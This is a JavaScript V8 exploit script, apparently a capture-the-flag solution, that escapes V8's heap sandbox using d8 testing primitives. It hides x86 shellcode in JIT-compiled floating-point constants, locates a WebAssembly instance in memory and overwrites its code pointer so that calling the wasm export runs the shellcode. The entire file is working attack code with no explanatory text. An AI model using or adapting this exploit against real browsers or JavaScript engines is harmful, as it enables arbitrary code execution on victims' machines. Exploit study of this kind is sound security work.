class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            // fill up new space external backing store bytes
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    hex(i) {
        return i.toString(16).padStart(16, "0");
    }

    breakpoint() {
        this.buf.slice();
    }
}

var helper = new Helpers();

// =================== //
//     Start here!     //
// =================== //

var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var addrOf = (o) => Sandbox.getAddressOf(o);

var dv = new DataView(sbxMemView);

var readHeap4 = (offset) => dv.getUint32(offset, true);
var readHeap8 = (offset) => dv.getBigUint64(offset, true);

var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);

//ceb580067616c68
//ceb5a6674656768
//cebf63120e0c148
//ceb50d231d00148
//50f583b6ae78948
// console.log(helper.i64tof64(0xceb580067616c68n))
// console.log(helper.i64tof64(0xceb5a6674656768n))
// console.log(helper.i64tof64(0xcebf63120e0c148n))
// console.log(helper.i64tof64(0xceb50d231d00148n))
// console.log(helper.i64tof64(0x50f583b6ae78948n))

helper.scavenge_gc();
const shellcode = () => {

    return [1.9553825376526264e-246,
        1.956052573379787e-246,
        1.9995714719542577e-246,
        1.9533767332674093e-246,
        2.6348604765229606e-284];

}

for (var i = 0; i < 0x1000000; i++) {
    shellcode(); shellcode(); shellcode(); shellcode();
}

let inst = readHeap4(0x40a159 + 0x10 - 1);

inst += 0x62;
console.log(helper.hex(inst));

var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var f = wasmInstance.exports.main;

let wasmAddr = addrOf(wasmInstance)
console.log("wasmInstance @ " + wasmAddr.toString(16));


cage_base = readHeap4(0x40014)
console.log("CAGE_BASE @ " + cage_base.toString(16))

writeHeap8(wasmAddr + 0x60 - 0x8 - 0x10, helper.f64toi64(helper.pair_i32_to_f64(inst, cage_base)));

f()

